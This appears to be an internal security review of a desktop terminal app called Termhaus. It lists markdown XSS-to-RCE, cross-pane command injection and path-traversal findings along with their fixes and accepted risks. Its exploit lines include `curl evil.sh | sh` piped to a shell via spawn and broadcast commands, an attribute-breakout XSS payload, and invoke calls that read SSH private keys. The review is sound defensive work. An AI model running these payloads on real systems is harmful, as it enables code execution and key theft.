# Security Review — Termhaus

> General whole-app security review (not a branch diff). Date: 2026-06-12.
> Threat model: local desktop app where the WebKitGTK **webview** and any process
> running **inside a pane** (e.g. an untrusted CLI agent) are the relevant attackers;
> Tauri commands and the control socket are the privilege boundaries.

Status legend: `[ ]` todo · `[~]` in progress · `[x]` done · `[-]` won't fix / accepted risk

---

## Vuln 1 — XSS → RCE in markdown link rendering
- **Status:** `[x]` FIXED 2026-06-12
- **Severity:** HIGH (confidence 9/10) · `xss` (stored/DOM)
- **Location:** `src/lib/markdown.ts:36` (sink: `src/components/DocsPanel.tsx:317`)
- **Description:** `escapeHtml` (markdown.ts:21) escapes `&` `<` `>` but **not** `"`. The
  inline-link rule interpolates the URL into `title="${u}"`; a `"` in the URL breaks out
  of the attribute and injects live event-handler HTML, rendered via `innerHTML`. CSP is
  disabled (`tauri.conf.json` → `security.csp: null`), so there is no backstop.
- **Exploit:** Malicious `README.md` in a repo the victim opens → markdown like
  `[click](x" onmouseover="alert`+"`document.domain`"+`" z=")` renders an `<a>` with a live
  `onmouseover` → attacker JS runs in the webview → Tauri bridge (`pty_spawn`/`pty_write`)
  → host RCE.
- **Fix:**
  - [x] Add quote escaping to `escapeHtml` (`"` → `&quot;`, `'` → `&#39;`) — `markdown.ts:21`
  - [x] Corrected the misleading "user's own files, innerHTML is acceptable" header comment
  - [x] Added 2 regression tests (quoted link URL + quoted body text) — `markdown.test.ts`
  - [x] (Defense-in-depth) Set a real CSP — see Cross-cutting hardening below

---

## Vuln 2 — Ambient command execution across panes (`spawn`)
- **Status:** `[x]` MITIGATED 2026-06-12 (confirm-on-spawn) + documented
- **Severity:** HIGH / by-design per ADR-0007 (confidence 9 as a boundary crossing)
- **Location:** `src/lib/paneControl.ts:60` → `stores/workspace.ts` `spawnPane` → `src-tauri/src/pty.rs` (`$SHELL -lc`)
- **Description:** The `spawn` control op carries attacker-controlled `command` + `cwd`
  from any pane. Rust relays without attaching caller identity; TS never checks one. Any
  process in any pane gets full command execution as the app user, in any directory.
- **Exploit:** Untrusted agent in a pane runs `th spawn --cwd $HOME -- bash -c 'curl evil.sh | sh'`
  (or MCP `spawn_pane`) → new pane instantly runs the payload with the user's privileges.
- **Decision (taken):** hybrid — accept the same-user trust model as baseline + gate the one
  silent-RCE op (`spawn`) behind confirmation. Full per-pane capability system deferred.
  - [x] Gate `spawn` behind a user confirmation prompt — `paneControl.ts` `spawn` dispatch,
    new setting `confirmExternalSpawn` (default on, Settings → Behaviour). Covers both `th`
    and `th-mcp` (shared relay → dispatch).
  - [x] Documented the trust model + the sharp edge in `docs/adr/0007-*.md` (new "Security model"
    section).
  - [ ] (Deferred / roadmap) Per-pane opt-in capability with caller identity from the relay —
    only if untrusted third-party agents become a use case.

---

## Vuln 3 — Cross-pane keystroke injection (`send` / `broadcast`)
- **Status:** `[-]` ACCEPTED 2026-06-12 — visible-by-design, documented
- **Severity:** HIGH / by-design per ADR-0007 (confidence 9 as a boundary crossing)
- **Location:** `src/lib/paneControl.ts:50` (`send`), `:77` (`broadcast`)
- **Description:** `send`/`broadcast` write arbitrary text + trailing `\r` directly into
  another pane's PTY. If the target sits at a shell prompt, injected text executes there.
  Any pane can target any other pane (or broadcast to all) with no caller check.
- **Exploit:** Agent in pane A runs `th broadcast 'curl evil.sh | sh'` → every other pane
  (root shell, `ssh root@prod`, second agent) runs the line in its own context.
- **Decision (taken):** ACCEPTED as baseline trust model, not gated. Rationale: `send`/`broadcast`
  type into a *visible* pane — the injected text and its output are on screen, so the blast radius
  is observable, and these are the core fleet feature (gating them guts the ergonomics). The silent
  vector (`spawn`) is the one we gated (Vuln 2). Documented in `docs/adr/0007-*.md`.
  - [ ] (Deferred / roadmap) Per-pane opt-in default-deny, same mechanism as Vuln 2's deferred item.

---

## Vuln 4 — Arbitrary file read via `read_doc`
- **Status:** `[x]` FIXED 2026-06-12
- **Severity:** MEDIUM (confidence 7/10) · `path_traversal`
- **Location:** `src-tauri/src/docs.rs:105`
- **Description:** `read_doc(path)` reads any path — no root containment, no canonicalization,
  no extension check (comment: "Any path is allowed"). Callable from the webview. 2 MiB cap.
- **Exploit:** Webview JS (e.g. via Vuln 1) calls `invoke('read_doc', { path: '/home/user/.ssh/id_ed25519' })`.
- **Fix (applied — `docs.rs:110`):**
  - [x] Enforce the `is_markdown` extension allowlist on the requested path
  - [x] `canonicalize()` then re-check the extension on the real target (closes the
    `foo.md` → secret symlink bypass)
  - Note: not bound to a single root because the native picker legitimately opens any folder;
    the markdown-only restriction is what blocks the high-value targets (keys/`.env`/`/etc`).

---

## Vuln 5 — Uncapped arbitrary file read via `git_diff` untracked branch
- **Status:** `[x]` FIXED 2026-06-12
- **Severity:** MEDIUM (confidence 7/10) · `path_traversal` / argument-injection
- **Location:** `src-tauri/src/git.rs:167`
- **Description:** The `untracked` branch runs `git diff --no-index --color=never -- /dev/null <path>`
  with `path` (a free-form Tauri param) as the trailing arg. `git diff --no-index` prints the
  full contents of any named file, with no size cap. The `--` precedes `/dev/null`, not `path`.
- **Exploit:** `invoke('git_diff', { cwd:'/repo', path:'/home/user/.ssh/id_rsa', untracked:true })`.
- **Fix (applied — `git.rs:167`):**
  - [x] Resolve `path` against the repo root, `canonicalize()`, and require the target to live
    inside the canonical root before running `--no-index` (absolute paths and `..` escapes both
    rejected; the diff now runs against the validated canonical path)

---

## Cross-cutting hardening
- **Status:** `[~]` APPLIED 2026-06-12 — needs live verification
- [x] Set a restrictive CSP in `tauri.conf.json` (was `null`). Key part is `script-src 'self'`,
  which blocks inline event handlers/scripts — the defense-in-depth backstop for Vuln 1.
  Applied policy:
  `default-src 'self'; img-src 'self' asset: http://asset.localhost data: blob:; style-src 'self' 'unsafe-inline'; font-src 'self' data:; script-src 'self'; connect-src 'self' ipc: http://ipc.localhost`
- [ ] **VERIFY:** run `npm run tauri dev` and confirm the app still renders (xterm, panels,
  PTY output over the IPC Channel). `style-src 'unsafe-inline'` is intentionally kept (xterm +
  inline component styles need it). If anything breaks under WebKitGTK, loosen the specific
  directive that's failing (check the webview console for CSP violation reports).

---

## Checked and NOT vulnerable (for the record)
- `capture.rs` — constant argv, no shell (`slurp` geometry passed as a discrete arg)
- `logs.rs` — confines reads to the logs dir
- `workspace.rs` — config-key allowlist + filename sanitization
- `pty.rs` — running commands is the app's purpose (by design)
- `control.rs` relay reply path — app-internal `req_id`, not attacker-influenced
- `ansi.ts` / `SessionLogViewer` / `Terminal` / `ptyClient` — text interpolation or
  `term.write()`, no HTML sink
- Tauri capabilities — scoped; no broad `fs` / `shell` / `http`
- Only **two** `innerHTML` sites exist in `src/` — both the markdown one in Vuln 1

> Note on the control socket (`control.rs`): a `/tmp` fallback path exists when
> `$XDG_RUNTIME_DIR` is unset (predictable name, mode set after `bind`). Lower confidence (7)
> and only relevant on multi-user hosts without systemd. Track here if you care about that
> environment: `[ ]` place the fallback socket in a per-user `0700` dir + verify ownership /
> `SO_PEERCRED`.
